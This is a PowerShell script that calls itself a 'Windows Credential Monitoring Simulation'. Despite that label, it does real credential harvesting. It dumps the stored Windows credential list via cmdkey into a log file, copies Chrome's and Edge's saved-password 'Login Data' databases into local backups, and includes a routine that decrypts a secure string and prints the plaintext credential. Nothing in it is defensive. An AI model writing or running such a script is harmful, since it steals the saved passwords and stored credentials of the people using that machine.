$ErrorActionPreference = "Stop"

Write-Host "Windows Credential Monitoring Simulation"

Function Get-StoredCredentials {
    Write-Host "`n[+] Capturing stored Windows credentials..."
    $output = cmdkey /list
    $output | Out-File -FilePath "credentials_log.txt"
    Write-Host $output
}

Function Get-BrowserPasswords {
    Write-Host "`n[+] Extracting saved browser passwords..."
    $localAppData = $env:LOCALAPPDATA
    $chromeLoginData = "$localAppData\Google\Chrome\User Data\Default\Login Data"
    $edgeLoginData = "$localAppData\Microsoft\Edge\User Data\Default\Login Data"

    If (Test-Path $chromeLoginData) {
        Write-Host "[*] Chrome credentials detected."
        Copy-Item -Path $chromeLoginData -Destination "Chrome_LoginData_Backup" -Force
    }
    
    If (Test-Path $edgeLoginData) {
        Write-Host "[*] Edge credentials detected."
        Copy-Item -Path $edgeLoginData -Destination "Edge_LoginData_Backup" -Force
    }
}

Function Convert-SecureStringToPlainText {
    Param (
        [string]$encryptedData
    )
    
    Write-Host "`n[+] Attempting to decrypt credential..."
    try {
        $secureString = ConvertTo-SecureString $encryptedData -ErrorAction Stop
        $plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)
        )
        Write-Host "Decrypted Credential: $plainText"
    } catch {
        Write-Host "[!] Failed to decrypt credential. Ensure proper permissions."
    }
}

Get-StoredCredentials
Get-BrowserPasswords
